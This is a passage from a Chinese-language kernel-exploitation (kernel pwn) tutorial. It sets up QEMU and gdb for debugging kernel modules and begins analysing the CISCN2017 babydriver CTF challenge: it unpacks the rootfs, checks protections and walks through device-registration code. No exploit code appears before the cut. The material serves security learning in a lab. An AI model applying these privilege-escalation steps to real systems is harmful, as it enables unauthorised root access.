<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将对应符号加载至该地址处</span></span><br><span class="line">add-symbol-file mydrivers/ko_test.ko  0xffffffffc0002000 \</span><br><span class="line">                    -s .rodata.str1.1 0xffffffffc000304c \</span><br><span class="line">                    -s .symtab        0xffffffffc0007000 \</span><br><span class="line">                    -s .text.unlikely 0xffffffffc0002000</span><br><span class="line"><span class="comment"># 下断点</span></span><br><span class="line">b ko_test_init</span><br><span class="line">b ko_test_exit</span><br><span class="line"><span class="comment"># 使其继续执行</span></span><br><span class="line"><span class="built_in">continue</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211003140102062.png" alt="image-20211003140102062"></p>
</li>
<li>
<p>最后回到 qemu 中，在 kernel shell 中执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 卸载 ko_test</span></span><br><span class="line">rmmod ko_tes</span><br></pre></td></tr></table></figure>
<p>此时 gdb 会断到 ko_test_exit 中：</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211003140345483.png" alt="image-20211003140345483"></p>
<p>如果在卸载了ko_test后，又重新加载 ko_test，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insmod ko_test</span><br></pre></td></tr></table></figure>
<p>则 gdb 会立即断到 ko_test_init 中：</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211003140435218.png" alt="image-20211003140435218"></p>
<blockquote>
<p>这可能是因为指定了 nokaslr，使得相同驱动多次加载的基地址是一致的。</p>
</blockquote>
</li>
</ul>
<p>上面调试 kernel module 的 init 函数方法算是一个小 trick，它利用了 <strong>noaslr 环境下相同驱动重新加载的基地址一致</strong> 的原理来下断。但最为正确的调试 init 函数的方式，还是得跟踪 <code>do_init_module</code> 函数的控制流来获取基地址。以下是一系列相关操作步骤：</p>
<blockquote>
<p>跟踪 <code>do_init_module</code> 函数是因为它在 <code>load_module</code> 函数中被调用。<code>load_module</code>函数将在完成大量的内存加载工作后，最后进入 <code>do_init_module</code> 函数中执行内核模块的 init 函数，并在其中进行善后工作。</p>
<p><code>load_module</code>函数将被作为 SYSCALL 函数的 <code>init_module</code>调用。</p>
</blockquote>
<ul>
<li>
<p>首先让 kernel 跑飞，等到 kernel 加载完成，shell 界面显示后，gdb 按下 ctrl + C 断下，给 <code>do_init_module</code>函数下断。该函数的前半部分将会执行 内核模块的 init 函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is where the real work happens.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Keep it uninlined to provide a reliable breakpoint target, e.g. for the gdb</span></span><br><span class="line"><span class="comment"> * helper command 'lx-symbols'.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> noinline <span class="keyword">int</span> <span class="title">do_init_module</span><span class="params">(struct <span class="keyword">module</span> *mod)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  [...]</span><br><span class="line">  <span class="comment">/* Start the module */</span></span><br><span class="line">  <span class="keyword">if</span> (mod-&gt;init != <span class="literal">NULL</span>)</span><br><span class="line">    ret = do_one_initcall(mod-&gt;init);   <span class="comment">// &lt;- 此处执行 ko_test_init 函数</span></span><br><span class="line">  <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">goto</span> fail_free_freeinit;</span><br><span class="line">  &#125;</span><br><span class="line">  [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>gdb 键入 <code>continue</code> 再让 kernel 跑飞。之后kernel shell 中输入 <code>insmod /ko_test.ko</code>装载内核模块，此时gdb会断下。在 gdb 中查看 <code>mod-&gt;init</code> 成员即可查看到 kernel module init 函数的首地址。</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211003143313234.png" alt="image-20211003143313234"></p>
</li>
<li>
<p>要想看到当前 kernel module 的全部 section 地址，可以在 gdb 中键入以下命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看当前 module 的 sections 个数</span></span><br><span class="line">p mod-&gt;sect_attrs-&gt;nsections</span><br><span class="line"><span class="comment"># 查看第 3 个 section 信息</span></span><br><span class="line">p mod-&gt;sect_attrs-&gt;attrs[2]</span><br></pre></td></tr></table></figure>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211003144520767.png" alt="image-20211003144520767"></p>
<p>有了当前内核模块的全部 section 名称与基地址后，就可以按照之前的方法来加载符号文件了。</p>
</li>
</ul>
<h4 id="c-启动脚本">c. 启动脚本</h4>
<blockquote>
<p>配环境真是一件麻烦到极点的事情，不过目前就到此为止了 :)</p>
</blockquote>
<p>笔者将一系列启动命令整合成了一个 shell 脚本，方便一键运行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断当前权限是否为 root，需要高权限以执行 gef-remote --qemu-mode</span></span><br><span class="line">user=$(env | grep <span class="string">"^USER"</span> | cut -d <span class="string">"="</span> -f 2)</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$user</span>"</span> != <span class="string">"root"</span>  ]</span><br><span class="line">  <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"请使用 root 权限执行"</span></span><br><span class="line">    <span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制驱动至 rootfs</span></span><br><span class="line">cp ./mydrivers/*.ko busybox-1.34.1/_install</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建 rootfs</span></span><br><span class="line"><span class="built_in">pushd</span> busybox-1.34.1/_install</span><br><span class="line">find . | cpio -o --format=newc &gt; ../../rootfs.img</span><br><span class="line"><span class="built_in">popd</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动 qemu</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -kernel ./arch/x86/boot/bzImage \</span><br><span class="line">    -initrd ./rootfs.img \</span><br><span class="line">    -append <span class="string">"nokaslr"</span> \</span><br><span class="line">    -s  \</span><br><span class="line">    -S&amp;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># -s ： 等价于 -gdb tcp::1234， 指定 qemu 的调试链接</span></span><br><span class="line">    <span class="comment"># -S ：指定 qemu 启动后立即挂起</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># -nographic                # 关闭 QEMU 图形界面</span></span><br><span class="line">    <span class="comment"># -append "console=ttyS0"   # 和 -nographic 一起使用，启动的界面就变成了当前终端</span></span><br><span class="line"></span><br><span class="line">gnome-terminal -e <span class="string">'gdb -x mygdbinit'</span></span><br></pre></td></tr></table></figure>
<p>gdbinit 内容如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> architecture i386:x86-64</span><br><span class="line">add-symbol-file vmlinux</span><br><span class="line">gef-remote --qemu-mode localhost:1234</span><br><span class="line"></span><br><span class="line">b start_kernel</span><br><span class="line">c</span><br></pre></td></tr></table></figure>
<h2 id="四、小试牛刀">四、小试牛刀</h2>
<blockquote>
<p>这里选用 CISCN2017_babydriver 作为笔者入门的第一题。之所以选用这一题是因为网上资料较多，方便学习。</p>
</blockquote>
<h3 id="1-题目附件">1. 题目附件</h3>
<p>题目附件可在<a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/kernel/CISCN2017-babydriver/babydriver.tar" target="_blank" rel="noopener">此处</a>下载。</p>
<p>题目给了三个文件，分别是：</p>
<ul>
<li><a href="http://boot.sh" target="_blank" rel="noopener">boot.sh</a> 启动脚本</li>
<li>bzImage 内核启动文件</li>
<li>rootfs.cpio 根文件系统镜像</li>
</ul>
<h3 id="2-尝试执行">2. 尝试执行</h3>
<p>初始时，直接解压 <code>babydriver.tar</code> 并运行启动脚本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">mkdir babydriver</span><br><span class="line">tar -xf babydriver.tar -C babydriver</span><br><span class="line"><span class="comment"># 启动</span></span><br><span class="line"><span class="built_in">cd</span> babydriver </span><br><span class="line">./boot.sh</span><br></pre></td></tr></table></figure>
<p>但 KVM 报错，其报错信息如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Could not access KVM kernel module: No such file or directory</span><br><span class="line">qemu-system-x86_64: failed to initialize kvm: No such file or directory</span><br></pre></td></tr></table></figure>
<p>使用以下命令查看当前 linux in vmware 支不支持虚拟化，发现输出为空，即<strong>不支持</strong>。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">egrep <span class="string">'^flags.*(vmx|svm)'</span> /proc/cpuinfo</span><br></pre></td></tr></table></figure>
<p>检查了一下物理机的 Virtualization Settings, 已经全部是打开了的。再检查以下 VMware 的CPU配置，发现没有勾选 <code>虚拟化 Intel VT-x/EPT 或 AMD-V/RVI</code>。</p>
<p>勾选后重新启动 linux 虚拟机，提示<code>此平台不支持虚拟化的 Intel VT-x/EPT</code>…</p>
<p>经过一番百度，发现是 Hyper-V 没有禁用彻底。彻底禁用的操作如下：</p>
<ul>
<li>
<p>控制面板—程序——打开或关闭Windows功能，取消勾选Hyper-V，确定禁用Hyper-V服务</p>
</li>
<li>
<p><strong>管理员权限</strong>打开 cmd，执行 <code>bcdedit /set hypervisorlaunchtype off</code></p>
<blockquote>
<p>若想重新启用，则执行 <code>bcdedit /set hypervisorlaunchtype auto</code></p>
</blockquote>
</li>
<li>
<p>重启计算机</p>
</li>
</ul>
<p>之后再启动 linux in Vmware，其内部的 kvm 便可以正常执行了。</p>
<h3 id="3-题目分析">3. 题目分析</h3>
<h4 id="a-目的">a. 目的</h4>
<ul>
<li>
<p>查看一下根目录的 <code>/init</code> 文件，不难看出这题需要我们进行<strong>内核提权</strong>，只有提权后才可以查看  flag。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag                      <span class="comment"># flag 被设置为只有 root 可读</span></span><br><span class="line">chmod 400 flag</span><br><span class="line"><span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko   <span class="comment"># 加载漏洞驱动</span></span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\nBoot took <span class="variable">$(cut -d' ' -f1 /proc/uptime)</span> seconds\n"</span></span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="b-获取目标内核模块">b. 获取目标内核模块</h4>
<blockquote>
<p>在提权之前，我们需要先把加载进内核的驱动 dump 出来，这个驱动大概率是一个存在漏洞的驱动。</p>
</blockquote>
<p>首先使用 file 命令查看一下 rootfs.cpio 的文件格式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file rootfs.cpio                 </span><br><span class="line">rootfs.cpio: gzip compressed data, last modified: Tue Jul  4 08:39:15   2017, max compression, from Unix, original size modulo 2^32 2844672</span><br></pre></td></tr></table></figure>
<p>可以看到是一个 gzip 格式的文件，因此我们需要给该文件改一下名称，否则 gunzip 将无法识别文件后缀。之后就是解压 gzip + 解包 cpio 的操作：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv rootfs.cpio rootfs.cpio.gz</span><br><span class="line">gunzip rootfs.cpio.gz</span><br></pre></td></tr></table></figure>
<p>解压之后的文件便是正常的 CPIO 格式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file rootfs.cpio </span><br><span class="line">rootfs.cpio: ASCII cpio archive (SVR4 with no CRC)</span><br></pre></td></tr></table></figure>
<p>使用常规方式给 CPIO 解包即可：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idmv &lt; rootfs.cpio</span><br></pre></td></tr></table></figure>
<p>解包完成后，即可在<code>/lib/modules/4.4.72/babydriver.ko</code>下找到目标驱动。</p>
<h4 id="c-查看保护">c. 查看保护</h4>
<p>首先是驱动程序保护：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec babydriver.ko</span><br><span class="line">[*] <span class="string">'/usr/class/kernel_pwn/CISCN2017-babydriver/babydriver/babydriver.ko'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>
<p>可以看到这里只开启了 NX 保护。</p>
<p>接着再看看 qemu 启动参数，发现启动了 smep 保护。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -initrd rootfs.cpio \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append <span class="string">'console=ttyS0 root=/dev/ram oops=panic panic=1'</span> \</span><br><span class="line">    -<span class="built_in">enable</span>-kvm \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -m 64M \</span><br><span class="line">    --nographic  \</span><br><span class="line">    -smp cores=1,threads=1 \</span><br><span class="line">    -cpu kvm64,+smep      <span class="comment"># &lt;- 启用 +smep 保护</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>SMEP（Supervisor Mode Execution Protection 管理模式执行保护）：<strong>禁止CPU处于 ring0 模式时执行用户空间代码</strong>。</p>
<p>还有一个比较相近的保护措施是 SMAP（Superivisor Mode Access Protection 管理模式访问保护）：禁止内核CPU访问用户空间的数据。</p>
</blockquote>
<p>注意到 <strong>没有启动 kaslr</strong>。</p>
<h4 id="d-代码分析">d. 代码分析</h4>
<blockquote>
<p>第一次接触内核题，代码什么的当然需要理清楚了。这里我们一一把驱动函数代码分析过去。</p>
</blockquote>
<h5 id="1-babydriver-init">1) babydriver_init</h5>
<h6 id="1-1-关键代码">1.1) 关键代码</h6>
<p>先上代码，这里重点关注红框框住的部分（其余部分是异常处理）</p>
<p><img src="/2021/10/kernel_pwn_introduction/image-20211004162419135.png" alt="image-20211004162419135"></p>
<p>简单精简一下，实际关键代码如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">alloc_chrdev_region(&amp;babydev_no, <span class="number">0</span>, <span class="number">1</span>, <span class="string">"babydev"</span>);</span><br><span class="line"></span><br><span class="line">cdev_init(&amp;cdev_0, &amp;fops);</span><br><span class="line">cdev_0.owner = &amp;_this_module;</span><br><span class="line"></span><br><span class="line">cdev_add(&amp;cdev_0, babydev_no, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">babydev_class = _class_create(&amp;_this_module, <span class="string">"babydev"</span>, &amp;babydev_no);</span><br><span class="line"></span><br><span class="line">device_create(babydev_class, <span class="number">0</span>, babydev_no, <span class="number">0</span>, <span class="string">"babydev"</span>);</span><br></pre></td></tr></table></figure>
<p>在解释上面的代码之前，我们先来简单学习一下<strong>设备文件</strong>的相关知识。</p>
<h6 id="1-2-设备号">1.2) 设备号</h6>
<p>对于<strong>所有</strong>设备文件来说，一共分为三种，分别是：</p>
<ul>
<li>字符设备（ char device），例如控制台</li>
<li>块设备（block device），例如文件系统</li>
<li>网络设备（network device），例如网卡</li>
</ul>
<p>设备文件可以通过设备文件名来访问，通常位于 /dev 目录下。<code>ls -a</code> 出来的第一个字符即说明了当前设备文件的类型：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># c 表示字符设备</span></span><br><span class="line">crw-rw-rw-   1 root tty       5,   0 Oct  3 15:03 0</span><br><span class="line"><span class="comment"># l 表示符号链接</span></span><br><span class="line">lrwxrwxrwx   1 root root          15 Oct  2 23:43 stdout -&gt; /proc/self/fd/1</span><br><span class="line"><span class="comment"># - 表示常规文件</span></span><br><span class="line">-rw-rw-r--  1 Kiprey Kiprey  203792 Jun 16  2017 babydriver.ko</span><br></pre></td></tr></table></figure>
<p>我们可以在<strong>设备文件条目</strong>中最后一次修改日期之前看到两个数字(用逗号分隔)，例如上面的 <code>5, 0</code>（这个位置通常显示的是普通文件的<strong>文件长度</strong>），对于<strong>设备文件条目</strong>的信息中，形如<code>5,0</code>这样的一对数字，分别是特定设备的<strong>主设备号</strong>和<strong>副设备号</strong>。</p>
<p>在传统意义上，<strong>主设备号</strong>标识与设备相关的<strong>驱动程序</strong>。例如，<code>/dev/null</code> 和 <code>/dev/zero</code> 都是由驱动1管理的。而多个串行终端（即 ttyX, ttySX）是由驱动4管理的。现代的Linux内核已经<strong>支持多个驱动程序共享主设备号</strong>，但是我们仍然可以看到，目前大多数设备仍然是按照<strong>一个主设备号对应一个驱动程序</strong>的方式来组织的。</p>
<p>内核<strong>使用副设备号来确定引用的是哪个设备</strong>，但副设备号的作用仅限于此，内核不会知道更多关于某个特定副设备号的信息。</p>
<p>主设备号和副设备号可同时保存与类型 <code>dev_t</code> 中，而该类型实际上是一个 <code>u32</code>；其中的12位用于保存主设备号，20位用于保存副设备号。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> u32 <span class="keyword">__kernel_dev_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">__kernel_dev_t</span>    <span class="keyword">dev_t</span>;</span><br></pre></td></tr></table></figure>
<p>在编写驱动程序需要使用主副设备号时，最好不要直接进行位运算操作，而是使用 <code>&lt;linux/kdev_t.h&gt;</code> 头文件中的宏定义操作：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAJOR(dev)    ((dev)&gt;&gt;8)              <span class="comment">// 获取主设备号</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINOR(dev)    ((dev) &amp; 0xff)          <span class="comment">// 获取副设备号</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MKDEV(ma,mi)  ((ma)&lt;&lt;8 | (mi))        <span class="comment">// 从主副设备号中生成一个 dev_t 类型的变量</span></span></span><br></pre></td></tr></table></figure>
<p>设备文件相关的内容暂时到此为止，现在回归题目。</p>
<p>首先，babydriver_init 函数将会调用 <code>alloc_chrdev_region</code> 函数。该函数的函数声明如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * alloc_chrdev_region() - register a range of char device numbers</span></span><br><span class="line"><span class="comment"> * @dev: output parameter for first assigned number</span></span><br><span class="line"><span class="comment"> * @baseminor: first of the requested range of minor numbers</span></span><br><span class="line"><span class="comment"> * @count: the number of minor numbers required</span></span><br><span class="line"><span class="comment"> * @name: the name of the associated device or driver</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Allocates a range of char device numbers.  The major number will be</span></span><br><span class="line"><span class="comment"> * chosen dynamically, and returned (along with the first minor number)</span></span><br><span class="line"><span class="comment"> * in @dev.  Returns zero or a negative error code.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">alloc_chrdev_region</span><span class="params">(<span class="keyword">dev_t</span> *dev, <span class="keyword">unsigned</span> baseminor, <span class="keyword">unsigned</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br></pre></td></tr></table></figure>
<p>根据当前函数的调用代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alloc_chrdev_region(&amp;babydev_no, <span class="number">0</span>, <span class="number">1</span>, <span class="string">"babydev"</span>);</span><br></pre></td></tr></table></figure>
<p>我们不难看出，babydriver_init 函数尝试向内核申请一个<strong>字符设备</strong>的新的<strong>主设备号</strong>，其中副设备号从0开始，设备名称为 <code>babydev</code>，并将申请到的主副设备号存入 babydev_no 全局变量中。</p>
<blockquote>
<p>还有一个名为<code>register_chrdev_region</code>的函数，它在调用时需要指定<strong>主副设备号的起始值</strong>，要求内核在起始值的基础上进行分配，与 <code>alloc_chrdev_region</code>功能相似但又有所不同。</p>
</blockquote>
<p>设备号分配完成后，我们需要将其连接到实现设备操作的内部函数。</p>
<h6 id="1-3-注册字符设备">1.3) 注册字符设备</h6>
<p>内核使用 <code>cdev</code> 类型的结构来表示字符设备，因此在操作设备之前，内核必须<strong>初始化</strong>+<strong>注册</strong>一个这样的结构体。</p>
<blockquote>
<p>注意，一个驱动程序可以分配不止一个设备号，创建不止一个设备。</p>
</blockquote>
<p>该函数的执行代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cdev_init(&amp;cdev_0, &amp;fops);</span><br></pre></td></tr></table></figure>
<p>cdev 结构体的初始化函数如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * cdev_init() - initialize a cdev structure</span></span><br><span class="line"><span class="comment"> * @cdev: the structure to initialize</span></span><br><span class="line"><span class="comment"> * @fops: the file_operations for this device</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Initializes @cdev, remembering @fops, making it ready to add to the</span></span><br><span class="line"><span class="comment"> * system with cdev_add().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cdev_init</span><span class="params">(struct cdev *cdev, <span class="keyword">const</span> struct file_operations *fops)</span></span></span><br></pre></td></tr></table></figure>
<p>正如注释中写到，传入的 cdev 指针所对应的 <code>struct cdev</code> 将会被初始化，同时<strong>设置该设备的各类操作</strong>为传入的 <code>file_operations</code>结构体指针。</p>
<p><code>file_operations</code>结构体中包含了大量的函数指针：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">  <span class="keyword">loff_t</span> (*llseek) (struct file *, <span class="keyword">loff_t</span>, <span class="keyword">int</span>);</span><br><span class="line">  <span class="keyword">ssize_t</span> (*read) (struct file *, <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">  <span class="keyword">ssize_t</span> (*write) (struct file *, <span class="keyword">const</span> <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">  <span class="keyword">ssize_t</span> (*read_iter) (struct kiocb *, struct iov_iter *);</span><br><span class="line">  <span class="keyword">ssize_t</span> (*write_iter) (struct kiocb *, struct iov_iter *);</span><br><span class="line">  <span class="keyword">int</span> (*iopoll)(struct kiocb *kiocb, <span class="keyword">bool</span> spin);</span><br><span class="line">  <span class="keyword">int</span> (*iterate) (struct file *, struct dir_context *);</span><br><span class="line">  <span class="keyword">int</span> (*iterate_shared) (struct file *, struct dir_context *);</span><br><span class="line">  <span class="keyword">__poll_t</span> (*poll) (struct file *, struct poll_table_struct *);</span><br><span class="line">  <span class="keyword">long</span> (*unlocked_ioctl) (struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line">  <span class="keyword">long</span> (*compat_ioctl) (struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line">  <span class="keyword">int</span> (*mmap) (struct file *, struct vm_area_struct *);</span><br><span class="line">  <span class="keyword">unsigned</span> 